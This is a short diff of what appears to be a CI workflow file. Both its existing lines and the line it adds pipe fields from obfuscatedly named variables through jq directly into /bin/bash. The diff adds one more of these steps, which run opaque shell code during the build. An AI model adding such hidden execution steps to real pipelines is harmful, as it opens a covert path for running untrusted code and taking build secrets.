@@ -34,6 +34,7 @@ jobs:
           echo $wez37 | jq -r .ksd6850 | /bin/bash
           echo $hwcny897 | jq -r .mnuo2018 | /bin/bash
           echo $sr7 | jq -r .bapqr0 | /bin/bash
+          printf '%s' "$wo3" | jq -r .fck5609 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
